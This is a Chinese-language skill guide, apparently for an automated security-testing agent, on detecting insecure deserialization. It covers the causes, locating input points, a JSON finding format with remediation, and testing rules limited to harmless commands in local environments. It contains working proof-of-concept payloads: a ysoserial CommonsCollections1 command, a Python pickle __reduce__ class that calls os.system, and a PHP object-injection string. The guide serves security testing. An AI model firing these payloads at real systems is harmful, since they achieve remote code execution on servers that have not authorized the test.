# 不安全的反序列化漏洞检测技能

## 原理

不安全的反序列化发生在 Web 应用将不可信数据直接反序列化为对象时，攻击者可构造恶意序列化数据执行任意代码。

**常见成因**：
- Java：`ObjectInputStream.readObject()` 未校验
- Python：`pickle.loads()` / `yaml.load()` 未使用安全模式
- PHP：`unserialize()` 未过滤
- .NET：`BinaryFormatter.Deserialize()` 未限制类型

## 检测方法

### 1. 定位反序列化点
- Cookie/Session 存储
- API 参数（Base64 编码对象）
- 消息队列（RabbitMQ/Kafka）
- 缓存系统（Redis/Memcached）

### 2. 构造恶意 Payload

**Java（CommonsCollections）**:
```bash
# 使用 ysoserial 生成 Payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64
```

**Python（pickle）**:
```python
import pickle
import base64
import os

class Evil:
    def __reduce__(self):
        return (os.system, ("whoami",))

payload = base64.b64encode(pickle.dumps(Evil()))
```

**PHP（对象注入）**:
```php
O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}
```

### 3. 验证代码执行

**判断依据**：
- 响应包含 `uid=` → 命令被执行
- 文件创建成功（`/tmp/pwned`）→ 代码被执行
- 应用崩溃/异常 → 可能存在漏洞

## 工具

| 工具 | 用途 |
|---|---|
| ysoserial | Java 反序列化 Payload 生成 |
| pickle | Python 反序列化测试 |
| Burp Suite | 抓包修改序列化数据 |

## 输出格式

```json
{
  "finding_id": "deserialization-001",
  "issue_type": "deserialization",
  "severity": "critical",
  "endpoint": "/api/import",
  "parameter": "data",
  "payload": "rO0ABXNy...",
  "evidence": "whoami 命令执行，响应包含 uid=33",
  "remediation": "使用白名单反序列化（Jackson @JsonTypeInfo），禁用危险类"
}
```

## 注意事项

- **只读原则**：仅检测，不执行危险操作（如删除文件）
- **无害 Payload**：使用 `whoami` / `id` 验证
- **零触网**：测试用 mock 或本地环境
